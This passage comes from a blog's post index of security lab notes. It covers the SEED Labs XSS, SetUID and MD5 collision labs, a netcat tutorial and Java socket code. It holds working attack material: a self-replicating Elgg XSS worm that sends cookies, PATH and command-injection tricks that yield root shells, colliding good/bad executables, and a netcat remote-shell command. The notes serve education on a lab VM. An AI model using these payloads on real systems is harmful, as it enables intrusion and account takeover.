type=\"text/javascript\"&gt;var replicate=\"&lt;script id=\\\"daut\\\" type=\\\"text/javascript\\\"&gt;\".concat(document.getElementByID(\"daut\").innerHTML).concat(\"&lt;/\").concat(\"script&gt;\");...............&lt;/script&gt;The breakup of &lt;/ and script&gt; is required as the browser may distinguish it as the ending tag for the first &lt;script&gt;.This approach can be merged with the POST exploit to copy the required update and the code itself onto the victim’s account. The transfer of all code and data in the web takes place through URLencoding in which + denotes a &lt;space&gt;. Therefore, instead of using + to add strings (concatenation), we use the concat() function. Also if there are any addition operations, they should be done using a+b = a-(-b) method.The code clubbed with the POST exploit is as follows -&lt;script id=\"daut\" type=\"text/javascript\"&gt;var sp=\"&lt;script id=\\\"daut\\\" type=\\\"text/javascript\\\"&gt;\".concat(document.getElementByID(\"daut\").innerHTML).concat(\"&lt;/\").concat(\"script&gt;\");var sendurl=\"http://www.xsslabelgg.com/action/profile/edit\";var ts=elgg.security.token__elgg_ts;var token=elgg.security.token.__elgg_token;ff=new XMLHttpRequest();ff.open(\"POST\",sendurl,true);ff.setRequestHeader(\"Host\",\"www.xsslabelgg.com\");ff.setRequestHeader(\"Keep-Alive\",\"300\");ff.setRequestHeader(\"Connection\",\"keep-alive\");ff.setRequestHeader(\"Cookie\",document.cookie);ff.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");ff.setRequestHeader(\"Referer\",\"http://www.xsslabelgg.com/profile/\".concat(elgg.session.user[\"username\"]).concat(\"/edit\"));params=\"__elgg_ts=\".concat(ts).concat(\"&amp;__elgg_token=\").concat(token).concat(\"&amp;description=User-11-is-great\").concat(escape(sp)).concat(\"&amp;name=\").concat(elgg.session.user[\"username\"]).concat(\"&amp;accesslevel[description]=2&amp;guid=\").concat(elgg.session.user[\"guid\"]);ff.send(params);&lt;/script&gt;The escape() function converts the inner strings to URLencoding for http transfer. Now when a user views the profile of user11, the user’s account will have its ‘about me’ section set to “User-11-is-great”. Also the code itself will be copied to the user’s page. Also now since the code is in the user’s page, whenever a user views the account of this user, the code will get executed and the new user will also have his account modified. The add friend exploit can also e added to the above code as a new XMLHttpRequest part. That code will become the exact replica of the famous Samy’s worm attack of 2005.Task 7 : CountermeasuresElgg does have a built in countermeasures to defend against the XSS attack. The countermeasures have been deactivated and commented out to make the attack work. There is a custom built security plugin HTMLawed 1.8 on the Elgg web application which on activation, validates the user input and removes the tags from the input. This specific plugin is registered to the function filter_tags in the elgg/ engine/lib/input.php file. To turn on the countermeasure, we login to the application as admin, goto administration -&gt; plugins, and select security and spam in the dropdown menu. The HTMLawed 1.8 plugin is below. This can now be activated. In addition to this, there is another built-in PHP method called htmlspecialchars(), which is used to encode the special characters in the user input, such as encoding \"&lt;\" to &amp;lt, \"&gt;\" to &amp;gt, etc. Go to the directory elgg/views/default/output and find the function call htmlspecialchars in text.php, tagcloud.php, tags.php, access.php, tag.php, friendlytime.php, url.php, dropdown.php, email.php and confirmlink.php files. Uncomment the corresponding htmlspecialchars function calls in each file.The above was a detailed description of an XSS attack taking examples from the real world Samy’s Worm attack. The above is a documentation of a lab experiment by the name XSS attack lab (Elgg) from publicly available seed labs by Syracuse University. Seed Labs Copyright © Wenliang Du, Syracuse University. I do not own any software mentioned in the above document." }, { "title": "SetUID Attack Lab - SeedLabs", "url": "/blog/posts/setuid-attack-lab/", "categories": "Lab Practice Notes, Seed Labs", "tags": "setuid, linux, lab, seed-labs", "date": "2020-06-01 03:00:00 -0400", "snippet": "Set-UID is an important security mechanism in unix systems. When a Set-UID program is run, the executing program assumes the owner’s privileges irrespective of the user running the program. The tas...", "content": "Set-UID is an important security mechanism in unix systems. When a Set-UID program is run, the executing program assumes the owner’s privileges irrespective of the user running the program. The tasks are exploration based and are to be done on linux systems. The prebuilt VM called seedubuntu comes installed with all the required software. Various scenarios are duplicated using Set-UID programs. The problems with each are listed.Task 1 : Familiarizing with chsh, su, sudo chsh - This command helps change the current user’s login shell to another desired one. It accepts any executable as long as it is listed in /etc/shells file. su - This command is to switch user to another user specified one. It can also be used to do the job of sudo using su -c. sudo - This command is used to specify that the following command is to be executed with the permissions of the super user (super user do). If root has given the super user access rights (the ability to elevate current access rights as a normal user to super user which can be equivalent to root), the user can use sudo to elevate the permissions.NOTE - The sudo and su command combination can be used by a user with access rights to become the root user without knowing the password of the root user. sudo su is the command that changes to the root user if the current user has access rights.The above commands need to be Set-UID because the actions done by all the above commands are to be executed only with the access rights of root. If any normal user is to use these commands, he would not be able to get the results as he does not have sufficient rights to let the execution carry out the actions. Therefore, these executables are made Set-UID by the root, so when a user wants to execute these commands, his access rights will be elevated to that of the owner (i.e., root), and as a result he will be able to let the executable carry out the actions and see the results.Task 2 : Run Set-UID shell programs in linuxThe permissions parameters as seen after ls command have more 3 bits to the left of the one that specifies if the file in question is a file or a link or a directory. The 1st of these 3 bits signifies if the program is Set-UID or not. This makes the 3 bits 100 i.e., 4. Therefore, to make an executable Set-UID, the command is chmod 4&lt;&gt;&lt;&gt;&lt;&gt; &lt;file&gt;, where &lt;&gt; are general permissions. After an executable has been made Set-UID, the x bit that signifies the executable rights of it, becomes s. The task is to login as root and make a copy of a shell program called zsh to the tmp folder using command # cp /bin/zsh /tmp/testshell. This will create the program testshell which is a copy of zsh. We make this a Set-UID to root executable by command chmod 4755 /tmp/testshell. Now we create another user BOB and do not give him any explicit rights. Using this new user we navigate to /tmp. Here on checking the output of $whoami, we see BOB. Now we can execute the testshell, upon which, the output of whoami changes to root. This happens because the testshell program is a Set-UID to root executable. Now even a user user who does not have high level of access rights can do anything in the system as he has become the root.This problem is very grave and exists in the zsh shell program. The current default shell in linux is bash. On repeating the above task again with /bin/bash instead of using zsh, we see that upon executing testshell, now the output of whoami gives only BOB. Therefore, bash has protection against this flaw of Set-UID. Zsh on the other hand is not immune to this issue.Task 3 : Setup for remaining tasksAs seen, bash does not share the Set-UID exploit vulnerability with zsh. Therefore, the remaining tasks will be explored on zsh itself. For this we create a symbolic link to zsh and remove the link before it if it is a link to bash. The series of commands are →$ sudo su Enter password:# cd /bin# rm sh# ln -s zsh shThis has created a symbolic link to zsh as /bin/sh.Task 4 : PATH variable and system() vulnerabilityThe system() command is one that executes the command by the command name that is passed into itself treated as a function. The way system() does this is by creating or calling the shell program /bin/sh. To exploit the vulnerability, consider the situation where the root user has created a program in c using a system() command to emulate the ls command. This program is owned by root and is compiled as test and made a Set-UID to root executable.#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){ system(\"ls\"); return 0;}The PATH variable is that which tells the system where commands are located. Since commands are basically just executables, to run them we need to specify a path like /&lt;directory&gt;/&lt;command&gt;. Giving the PATH variable ensures that to run the command, the entire path need not be given. When the &lt;directory&gt; part of the command is added in the PATH variable, any command we type on the terminal is searched in the directories listed in the PATH variable. If the command is present is one of these mentioned directories, it gets executed. As a result instead of typing /&lt;directory&gt;/&lt;command&gt;, we just type &lt;command&gt;. This is compiled using $gcc -o test test.c. Now basically, any user who runs the executable test will actually be executing ls in his current working directory with root permissions. The exploit is to set the PATH environment variable to just the current directory and then making a script called ls which calls a shell. PATH environment variable is the one that stores the paths of all the executable so that users need not specify the exact location of that command from the / directory or the present working directory to execute that command. Consider the user BOB, writes a script -#!/bin/sh/bin/shThis script is named ls and is made executable by BOB. Now BOB, sets the PATH to the current directory by using $ export PATH=.. Now he runs the Set-UID executable test and gets a shell. Upon using whoami, he sees that he is actually root.$ ./test# /usr/bin/whoamiroot#On executing test, it actually calls ls on a shell. Since the PATH variable is set to the current directory, the system() command looks for ls only in the current directory where it finds the script which basically calls for the shell /bin/sh. Since the program is a Set-UID program, the shell called is the one with the access rights of the owner i.e., root. Since PATH is changed, the user needs to call all commands by giving absolute paths. But, he got the root shell. A similar exploit can be done by adding / to IFS environment variable.Now, the same task is repeated but this time, /bin/sh is changed to point to /bin/bash. Zsh had the vulnerability, but bash on executing the same command, does give the shell but it has the same access rights as the user who called the test executable. Hence, the exploit fails.Task 5 : Extension of task 4, system() vs execve()Background: BOB works for an auditing agency, and he needs to investigate a company for a suspected fraud. For the investigation purpose, BOB needs to be able to read all the files in the company’s Unix system; on the other hand, to protect the integrity of the system, Bob should not be able to modify any file. To achieve this goal, Vince, the superuser of the system, wrote a special set-root-uid program, and then gave the executable permission to BOB. This program requires BOB to type a file name at the command line, and then it will run /bin/cat to display the specified file. Since the program is running as a root, it can display any file BOB specifies. However, since the program has no write operations, Vince is very sure that BOB cannot use this special program to modify any file.The code is as follows →#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char *argv[]){ char* v[3]; if(argc &lt; 2) { printf(\"Please type a file name.\\n\"); return 1; } v[0] = \"/bin/cat\"; v[1] = argv[1]; v[2] = 0; int q = 0; if(q == 0) { char* command = malloc(strlen(v[0]) + strlen(v[1]) + 2); sprintf(command, \"%s %s\", v[0], v[1]); system(command); } else execve(v[0], v, 0); return 0;}Here, q is the variable control for us to shift between system() and execve() commands.Initially, q = 0. Therefore, system() will get executed. This is an extension to the the exploit on Set-UID programs with system() command. Here, BOB can exploit Set-UID vulnerability to actually modify files (which is contrary to what he should be able to do according to Vince). To do this, BOB basically makes use of special characters used in shell scripting to modify files. Consider a file called test.txt which is owned by root. BOB can read the contents of the file by using the above program’s executable which is a Set-UID to root executable (calls /bin/cat with root permissions). Now BOB can actually exploit the program by making use of &amp;&amp; and ; operators. He can execute something like →$ ./test \"test.txt;mv test.txt ruty.txt\"&lt;contents of text.txt&gt;After this operation, test.txt would have been renamed to ruty.txt. The same can also be accomplished using the &amp;&amp; operator as well as these have special meaning in shell programs. Another way to check the permissions is$ ./test \"test.txt &amp;&amp; whoami\"&lt;contents of text.txt&gt;rootSince the system() command passes the given parameters onto a shell, the whoami gets executed with the permissions of the owner of the program’s Set-UID to root executable. Hence, we get root.One possible way to save from this vulnerability can be to edit the program to include a regular expression match to rule out special characters like $ &amp; ;.Now, when we make the value of q equal to 1 in the c file q = 1, the program basically executes execve(). This is different from system() in the sense that it does not pass the arguments to a shell. It simply executes the program that is passed to it as the first argument. The program must be a binary executable or a script start with shebang directive. The output using execve() is →$ ./test \"test.txt;whoami\"/bin/cat: test.txt;whoami : No such file or directoryTherefore, as seen system() is very dangerous compared to execve() for Set-UID programs.Task 6 : The LD_PRELOAD environment variableFor normal executions of programs, the linux dynamic loader finds and loads the shared libraries needed by the program. The shared libraries are loaded in whatever order the loader needs them in order to resolve symbols. An environmental variable called LD_PRELOAD contains the paths to shared libraries or shared objects. The loader will load these before any other library, even the C runtime library. This is called preloading a library. When a library is preloaded, the functions defined in it are used before the functions with the same name in other libraries that are loaded later. This enables library functions to be overwritten. As a result we can modify program actions without the need of recompilation. Eg - we write a library to define malloc and free. After loading this into the LD_PRELOAD, we can use the new definitions as the library will be preloaded. It is exported in the same way PATH variable is exported. This is used many times for Set-UID attacks. There is a mechanism which prevents the attacks which is to be explored in this task.This task is about making a dynamic link library which will override the sleep() function. This will be used for Set-UID attack, and the conditions for which the loader will ignore the LD_PRELOAD so as to prevent the Set-UID attacks will be explored. The task has 4 different cases for this exploration.The dll we make is →#include&lt;stdio.h&gt;void sleep(int s){ printf(\"I am not sleeping\\n\");}We can compile this using →$ gcc -fPIC -g -c mylib.c$ gcc -shared -Wl,-soname,libmylib.so.1 -o libmylib.so.1.0.1 mylib.o -lcThe LD_PRELOAD can be set using →export LD_PRELOAD=./libmylib.so.1.0.1Now we create a program to call sleep() →int main(){ sleep(1); return 0;}The 4 cases are → Run normal program by normal user → Made, compiled and run by normal user, the sleep() function does get overwritten. We get the “I am not sleeping message”. Run Set-UID to root program by normal user → myprog.c compiled by root and executable is Set-UID, the sleep() function is not overwritten. There is a wait for 1 second and then prompt returns. Run Set-UID root program by root user → myprog.c compiled by root and executable is Set-UID, the sleep() function is not overwritten. There is a wait for 1 second and then prompt returns. But if the LD_PRELOAD is also exported by the root user, then the sleep() function gets overwritten and we see the “I am not sleeping” message. Run Set-UID user program by other non root user → In this case too, myprog.c compiled by non-root and executable is Set-UID and myprog is called by another non-root user, the sleep() function is not overwritten. There is a wait for 1 second and then prompt returns.The result is hence that the linker ignores the LD_PRELOAD environment variable if the real UID of the user id different than that of the same user’s effective UID. This is a prevention mechanism against the Set-UID attacks.Task 7 : Relinquishing privileges and cleanupToo be secure, the Set-UID programs call setuid() system call to permanently relinquish their rot privileges. Sometimes, this is not enough.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;void main(){ int fd; fd = open(\"etc/zzz\", O_RDWR | O_APPEND); if (fd == -1) { printf(\"cannot open it \\n\"); exit(0); } sleep(1); setuid(getuid()); if(fork()) { close(fd); exit(0); } else { write(fd, \"malicious data\\n\", 15); close(fd); } return 0;}We compile this as root and make the executable Set-UID to root. setuid() sets the effective user id of the current process. If the effective UID of the caller is root, the real UID and saved set-user-id are also set. We create a file /etc/zzz which is owned by root and the permissions are 0644. Now any other user should not be able to write to the file after the setuid() function is called and all the user privileges while the Set-UID was being executed is reset. On making the Set-UID to root executable and executing it by a different user, the result is that the file actually gets modified. The malicious data is actually appended to the file. Despite the presence of a function to drop all privileges, the write succeeded. This is so because the function was not placed properly. The setuid() was called only after the file was opened. To prevent other users from accessing files this way, the function should be declared before the opening of the file. This way the real UID and effective UID will be changed from root before the file is opened. If the function is called after the opening of the file, the privileges are dropped, but the program had already opened the file in write (append) mode as root itself. The above is a documentation of a lab experiment by the name Set-Uid attack lab from publicly available seed labs by Syracuse University. Seed Labs Copyright © Wenliang Du, Syracuse University. I do not own any software mentioned in the above document." }, { "title": "MD5 Collision Attack Lab - SeedLabs", "url": "/blog/posts/md5-collision-lab/", "categories": "Lab Practice Notes, Seed Labs", "tags": "md5-collision, cryptography, lab, seed-labs", "date": "2020-06-01 03:00:00 -0400", "snippet": "A hash function is said to be secure if it is a one way hash function and is collision resistant. The one way property ensures that given a hash value h, it is computationally infeasible to find an...", "content": "A hash function is said to be secure if it is a one way hash function and is collision resistant. The one way property ensures that given a hash value h, it is computationally infeasible to find an input m such that hash(m) = h. The collision resistance property ensures that it is computationally infeasible to find two inputs m and n such that hash(m) = hash(n). The experiment is about actually launching collision attacks on MD5 hash function. A tool called Fast MD5 Collision Generator is used.Task 1 : Generating two different files with the same MD5 hashTo do this, we create two different files with same beginning part or prefix. Then we use the above mentioned tool which allows us to create an arbitrary file, the contents of which will be used as prefix to generate two files out1.bin and out2.bin which will have the same MD5 hash. Command is -md5collgen -p prefix.txt -o out1.bin out2.binThe tool generates parts P and Q for given prefix text such that hash(prefix + P) = hash(prefix + Q). To check if the output files are different and the hash sums are same, we can use commands -diff out1.bin out2.binmd5sum out1.binmd5sum out2.binWe can use a hex editor (example GHex) to read and modify the binary files. We can use python to pass values inside the prefix file. Let examples be of the form -echo $(python -c 'print(\"\\x41\"*55)') &gt; prefix.txtThis will add 55 A’s to the prefix file. The examples will have 55 replaced with other numbers for different cases.Prefix file &lt; 64 bytesIf the length of the prefix file is not a multiple of 64B, we run the md5collgen tool to produce the two output files. The files are verified to be different by using diff command. The files are opened using GHex. On looking into the hex editor, we see that all bytes the prefix is short of a multiple of 64 are padded with regular expression - (0A)(00)*.Prefix file = 64 bytesIf the length of the prefix file is exactly 64 bytes, the tool still pads the prefix but this time pads the next 64 bytes i.e., from byte offset 40 to 7F. The same is true when the length is a multiple of 64 bytes. Therefore, for length = 64*k, the tool adds a pad of 64 bytes after it.Difference between dataThe two files generated are very slightly different. Taking the example -echo $(python -c 'print(\"\\x41\"*60)') &gt; prefix.txtThis adds 4 bytes of padding and then data that may or may not differ between 2 files. For the above case, the values that were actually different were located at byte offsets 93 and BB.Task 2 : Understanding MD5’s propertyAt high level, MD5 divides its data into blocks of 64 bytes and then computes the hash iteratively on these blocks. The core of MD5 is a compression function which produces a 128 bit IHV or intermediate hash value. The input for the first iteration i.e., IHV0 is fixed. Based on the working of the MD5 algorithm, we can derive a property which is - Given two inputs M and N, if MD5(M) = MD5(N), then for any input T, MD5(M || T) = MD5(N || T). Therefore, adding a particular suffix to any two distinct messages having the same MD5 hash, gives two new longer messages for by concatenation of the original and the suffix messages, both of which also have the same MD5 hash. To demonstrate this, we use the cat command in bash, to concatenate the contents of files -cat &gt; prefixasdfghjklmd5collgen -p prefix -o file1 file2MD5 collision generator v1.5by Marc Stevens (http://www.win.tue.nl/hashclash/)Using output filenames: 'file1' and 'file2'Using prefixfile: 'prefix'Using initial value: 3c314196e1dd87fadfe827be4e35094cGenerating first block: ..........Generating second block: S00......Running time: 18.89 sdiff file1 file2Binary files file1 and file2 differcat &gt; suffixqwertyltotal 16-rw-rw-r-- 1 seed seed 192 Mar 16 11:50 file1-rw-rw-r-- 1 seed seed 192 Mar 16 11:50 file2-rw-rw-r-- 1 seed seed 10 Mar 16 11:49 prefix-rw-rw-r-- 1 seed seed 7 Mar 16 11:51 suffixmd5sum file1a99e149410559bb7556234176df8cb2c file1md5sum file2a99e149410559bb7556234176df8cb2c file2cat file1 suffix &gt; modfile1cat file2 suffix &gt; modfile2md5sum modfile1c3f590a71d69ad69b0fed60867f05529 modfile1md5sum modfile2c3f590a71d69ad69b0fed60867f05529 modfile2Task 3 : Generating two executable files with the same MD5 hashGiven a code in C, create two different versions of this code such that the difference in them lies in the array contents, but the hash values of their executables are the same. The code is -#include &lt;stdio.h&gt;unsigned char xyz[200] = {}; // populated with self values.// let's see how taio reacts to very long lines when they are supposed to be printed on a pdf. This seems to be wrapping text easily, would it be that good&gt;&gt;??? Time to find out.int main(){ int i; for (i=0; i&lt;200; i++) { printf(\"%x\", xyz[i]); } printf(\"\\n\"); return 0;}Initially, we fill the array contents with just A’s. This makes it easy to spot the location of the array in the executable after compilation. To print 200 A’s, we can use python -print('\\''+'\\',\\''.join(x for x in ['A']*200)+'\\'')Now to compile and open the executable, we use gcc and then GHex respectively. Spotting the location of a continuous block of A’s, the byte offset is 1040 (4160). Now the whole executable can be divided into 3 parts - byte offset 0 to x, x to y and y to end. The part y to end will be treated as a suffix. The part 0 to x is treated as prefix. The part x to y is the one where the change is required, or variant, such that - MD5(prefix || variant1 || suffix) = MD5(prefix || variant2 || suffix). We keep the prefix little over the byte offset of the first A as well as a multiple of 64. Therefore, choosing byte offset 4224, everything of the first 4224 bytes is the prefix.head -c 4224 a.out &gt; prefixUsing this prefix file for md5collgen, get two files having the same hash called file1 and file 2.md5collgen -p prefix -o file1 file2This gives the files with ending byte offset as 10FF. Therefore, we need to keep the bytes after 10FF from the original binary as the suffix.tail -c +4352 a.out &gt; suffixNow to create the two binaries, concatenate the suffix to the two individual files.cat file1 suffix &gt; code1$ cat file2 suffix &gt; code2These code files can be made executables, which upon execution print different data (one printed 1 byte more than the other in this case). However, the md5sum of both the codes are the same. One way to make sure that the data output by the code files are different is to compute a hash on them. If the hashes are different then the files indeed printed different data.echo $(./code1) | md5sumededed2819bd22f8732296e63229ca40 -echo $(./code2) | md5sumb12e08dfdbd9217653c20c39eb290aba -This proves that the experiment was successful in creating two different binaries from a single binary, both producing different output but having the same md5 hash.Task 4 : Making two programs behave differentlyThis task requires us to exploit the hash collision vulnerability. The main idea is to create a program that executes malicious code even after it has been verified as well as checked by hashing it. Therefore, the code needs to have two parts - a malicious and a good part. If the factor that decides whether the good code is executed or the bad one is something that can be exploited, then the attacker can use that to write a code that can pass all verification checks and still manage to run the malicious code. The idea behind the factor is to keep two arrays. If the contents are the same, execute good code, otherwise execute malicious code. Therefore, write a program as follows.#include&lt;stdio.h&gt;unsigned char b[200] = {&lt;populate&gt;};unsigned char a[200] = {&lt;populate&gt;};int main(){\tint flag = 1;\tint i;\tfor(i=0;i&lt;200;i++)\t{\t\t//printf(\"%c \", a[i]);\t\tif(a[i] != b[i])\t\t{\t\t\tflag = 0;\t\t\tbreak;\t\t}\t}\tif(flag)\t\tprintf(\"good code!\\n\");\telse\t\tprintf(\"bad code!\\n\");\treturn 0;}The arrays are populated with A’s, using python -print('\\''+'\\',\\''.join(x for x in ['A']*200)+'\\'')Compile to get an executable, a.out. All work will be done on this executable. Set the prefix using head command - this includes all the bytes before the start of the first array. Then generate two files using this prefix, which yields out1 and out2 having all except the last 8 elements of the first array. Add all bytes after the 4352nd one in a.out to suffixtest.head -c 4224 a.out &gt; prefixmd5collgen -p prefix -o out1 out2tail -c +4353 a.out &gt; suffixtestTo complete the first array in the files out1 and out2, add the first 8 bytes of suffixtest to both giving files out1arrcomplete and out2arrcomplete. Now the suffix file is created which contains all bytes after the 8th byte in suffixtest.head -c 8 suffixtest &gt; arrcompletecat out1 arrcomplete &gt; out1arrcompletecat out2 arrcomplete &gt; out2arrcompletetail -c +9 suffixtest &gt; suffixNow, to add the bytes between the ending of the first array and the beginning of the second array, make a file called tillnext. Store the bytes beginning with the second array in suffix to suffixtest. Add these bytes to out1arrcomplete and out2arrcomplete to give file1tillnext and file2tillnext.tail -c +25 suffix &gt; suffixtesthead -c 24 suffix &gt; tillnextcat out1arrcomplete tillnext &gt; file1tillnextcat out2arrcomplete tillnext &gt; file2tillnextNow the two result files are the two separate part executables which have the contents up to beginning of the second array. To make the attack successful, one file needs to print “good code” while the other “bad code”. To do this the contents of the second array needs to be equal to one of the generated arrays. So, put the bytes after the second array in suffixtest to suffix. Then copy the first array from out1arrcomplete to comparray. The file comparray can be appended to file1tillnext and file2tillnext along with suffix to give the final executables firstexec and secondexec.tail -c +201 suffixtest &gt; suffixtail -c +4161 out1arrcomplete &gt; comparraycat file1tillnext comparray suffix &gt; firstexeccat file2tillnext comparray suffix &gt; secondexecMake these two final files executable and calculate the md5 hash sum. Executing them both gives desired results.md5sum firstexece68a168be99f12c1bc782b7da5603f62 firstexecmd5sum secondexece68a168be99f12c1bc782b7da5603f62 secondexecchmod +x firstexecchmod +x secondexec./firstexecgood code!./secondexecbad code!This is how the md5 collision vulnerability can be exploited. The above is a documentation of a lab experiment by the name MD5 Collision Attack Lab from publicly available seed labs by Syracuse University. Seed Labs Copyright © Wenliang Du, Syracuse University. I do not own any software mentioned in the above document." }, { "title": "Basics of Linux Commands and NetCat", "url": "/blog/posts/linux-cli-netcat/", "categories": "Computers and Fun", "tags": "linux, tool, netcat", "date": "2020-05-30 08:00:00 -0400", "snippet": "A shell is an interface to the operating system’s services. All process are created by fork() and given a new direction by the exec() process. The trace of forks and calls can be seen from the stra...", "content": "A shell is an interface to the operating system’s services. All process are created by fork() and given a new direction by the exec() process. The trace of forks and calls can be seen from the strace command.Using shell scriptThis is more like using a shell to create more shell commands. A shell script is an executable which is executed by the terminal or the shell interpreter. Linux’s default shell is usually the bourne again shell or bash. The default commands available for the shell can be written as a script to perform more complex functions and can be run as an executable. Aliases can also be used.Using programming languages like c and c++The compiled code produces and executable which can be treated as a command. Example C++ snippet →#include&lt;iostream&gt;using namespace std;int main(){ cout&lt;&lt;\"Enter name - \"; string s; cin&gt;&gt;s; cout&lt;&lt;endl&lt;&lt;\"Welcome \"&lt;&lt;s&lt;&lt;\". System ready to rumble!!\"&lt;&lt;endl; return 0;}Common ground for the above two methodsIn both cases, we need to run the commands using ./command in the specific directory. This is not like a true command. All standard commands are stored as executables or as links to the executables in specific directories like /bin/ or /usr/bin/ etc. To actually call the command we do not specify the directory, we just specify the name without ./. There is a PATH variable which stores the locations of all the mentioned folders, which are searched when a command is called. To emulate the working of standard commands, we need to add the directory to the PATH using a command as follows →export PATH = \"$PATH:&lt;directory to be added&gt;\"This will be valid for the particular session on the bash terminal. Therefore, to make the command always available, we need to add this command to the .bashrc or .profile file in the home directory.Complexity increased - Use pythonMany packages are available for python which can be used to create commands for us which might actually help us in day to day work instead of using the commands as simple hello world programs. There are two types to classify this use as → Standard for different packages. Using optparse Refer to python code snippet for example on nmap package for python.#! /usr/bin/env python3import nmapimport sysnm=nmap.PortScanner()i = 0for ip in sys.argv: i = i+1 if i==1: continue else: nm.scan(ip, '21-443') for host in nm.all_hosts(): print(\"{} ({})\".format(host, nm[host].hostname())) for proto in nm[host].all_protocols(): for kk in nm[host][proto].keys(): if (kk==80) or (kk==443): print(\"{} : {}\".format(proto,kk)) #! is the shebang directive. Using optparse, the commands we make will be very similar to the existing command structure. We can even have the help section and error messages inbuilt which make the commands more interactive.ArgparseThe package optparse is now deprecated and replaced by argparse based on optparse. An example for a simple command to compute squares using argparse is as follows →import argparseparser = argparse.ArgumentParser()parser.add_argument(\"square\", type=int, help=\"display a square of a given number\")parser.add_argument(\"-v\", \"--verbosity\", type=int, choices=[0, 1, 2], help=\"increase output verbosity\")args = parser.parse_args()answer = args.square**2if args.verbosity == 2: print(\"the square of {} equals {}\".format(args.square, answer))elif args.verbosity == 1: print(\"{}^2 == {}\".format(args.square, answer))else: print(answer)The output is as follows →$ python x.pyusage: x.py [-h] [-v {0,1,2}] squarex.py: error: too few arguments$ python x.py 416$ python x.py -v 0 416$ python x.py -v 1 44^2 == 16$ python -v 2 4the square of 4 equals 16NetCatUse netcat to chatUse listen command on the server side. nc -l -p &lt;port&gt; Connect to the server from client on the same port.nc &lt;server&gt; &lt;port&gt; Can be done on the same machine also.Use netcat to send a fileUse server machine to give commandnc -v -w 30 -p &lt;port&gt; -l &lt; file.txt On the client machine give command nc -v -w 2 &lt;server ip&gt; &lt;port&gt; &gt; receivedfile.txt -w is for wait and the -v is for verbose output. The file.txt will be received as receivedfile.txt on the client machine. Works on local machine as well. Test.Netcat for banner grabbingIt can be done with telnet as well but this does not alter the stream of data unlike telnet. Just nc to the ip using a specific port to get the info regarding the server running.Port scanningUse -z for zero input output. nc -v &lt;ip&gt; -z &lt;port-start&gt;-&lt;port-end&gt; -n option can also be used. This does not do a DNS scan on the given ip address which does save time. Even -w can be used to wait specified number of seconds.Execute remote shell on windowsTo execute a remote shell on windows, get an nc command executed as follows nc -lp &lt;port&gt; -vv -e cmd.exe Then execute nc on the attacking machine as follows nc &lt;ip&gt; &lt;port&gt; It is always unencrypted. Since this is always unsafe, there is a version of netcat called cryptcat which has two fish encryption. If the listener uses the -e option it is called a direct shell. If the connecting machine uses the -e option it is called a reverse shell. This can help in situations where not both the machines on the network can port forward.Netcat to transfer files between two systems on a networkTo transfer a folder having the files to be sent, on the sender use command tar -cf - &lt;foldername&gt; | nc -l -p 1337 On the receiving machine type command nc &lt;sender ip&gt; 1337 | tar -xf -Ncatncat is a more modern version of netcat which is implemented by nmap libraries. It has support for multiple protocols and transmission over ssl. On the listener type ncat [options] [arguments] --allow &lt;allowed ip&gt; -vln &lt;port&gt; --ssl Only connections from allowed ip will be allowed will have an encrypted channel. The connection will be allowed but not established form the allowed ip if the command from that ip does not contain the ssl option. On allowed ip type ncat -vn &lt;listener&gt; &lt;l port&gt; --sslResourcesArgparse" }, { "title": "Basics of Socket Programming in Java", "url": "/blog/posts/java-socket-programming/", "categories": "Computers and Fun", "tags": "java, programming, network, sockets", "date": "2020-05-28 08:00:00 -0400", "snippet": "Simple Client Programimport java.util.*;import java.net.*;import java.io.*;public class client{ public static void main(String[] args) throws Exception { Socket s = new Socket(\"localho...", "content": "Simple Client Programimport java.util.*;import java.net.*;import java.io.*;public class client{ public static void main(String[] args) throws Exception { Socket s = new Socket(\"localhost\", 12345); DataInputStream input = new DataInputStream(s.getInputStream()); DataOutputStream output = new DataOutputStream(s.getOutputStream()); BufferedReader reader = new BufferedReader(new InputStreamReader(System.in)); boolean x = true; while(x) { System.out.println(\"enter to send \"); String message = reader.readLine(); if(message.equals(\"stop\")) x = false; output.writeUTF(message); String response = input.readUTF(); System.out.println(\"server says --- \" + response); } s.close(); }}Simple Server Programimport java.net.*;import java.util.*;import java.io.*;public class server{ public static void main(String[] args) throws Exception { ServerSocket ss = new ServerSocket(12345); Socket s = ss.accept(); DataInputStream input = new DataInputStream(s.getInputStream()); DataOutputStream output = new DataOutputStream(s.getOutputStream()); BufferedReader reader = new BufferedReader(new InputStreamReader(System.in)); boolean x = true; while(x) { String message = input.readUTF(); System.out.println(\"client says --- \" + message); if(message.equals(\"stop\")) x = false; if(x) System.out.println(\"enter to send \"); String respond = x?reader.readLine():\"END_SESSION_!\"; output.writeUTF(respond); } s.close(); ss.close(); }}Multi-threaded Serverimport java.util.*;import java.net.*;import java.io.*;public class multithreadserver implements Runnable{ Socket client; multithreadserver(Socket client) { this.client = client; } public static void main(String[] args) throws Exception { ServerSocket ss = new ServerSocket(12345); while(true) { Socket sock = ss.accept(); new Thread(new multithreadserver(sock)).start(); } } public void run() { try { DataInputStream input = new DataInputStream(client.getInputStream()); DataOutputStream output = new DataOutputStream(client.getOutputStream()); BufferedReader reader = new BufferedReader(new InputStreamReader(System.in)); InetAddress addr = client.getInetAddress(); boolean x = true; while(x) { String message = input.readUTF(); System.out.println(addr.getHostAddress() + \"says --- \" + message); if(message.equals(\"stop\")) x = false; if(x) System.out.println(\"enter to send to \" + addr.getHostAddress()); String respond = x?reader.readLine():\"END_SESSION_!\"; output.writeUTF(respond); } client.close(); } catch(IOException e) { e.printStackTrace(); } }}Banner Grabbing - Get Requestimport java.util.*;import java.net.*;import java.io.*;public class get_request{ public static void main(String[] args) throws Exception { InetAddress addr = InetAddress.getByName(\"www.avajava.com\"); Socket client = new Socket(addr, 80); PrintWriter output = new PrintWriter(client.getOutputStream()); BufferedReader input = new BufferedReader(new InputStreamReader(client.getInputStream())); output.println(\"GET / HTTP/1.1\"); output.println(\"Host: www.avajava.com\"); output.println(); output.flush(); String line; while((line = input.readLine())!=null) { System.out.println(line); } }}Download Image using Get Requestimport java.util.*;import java.net.*;import java.io.*;public class download_image{ public static void main(String[] args) throws Exception { InetAddress addr = InetAddress.getByName(\"www.bits-pilani.ac.in\"); Socket client = new Socket(addr, 80); PrintWriter output = new PrintWriter(client.getOutputStream()); 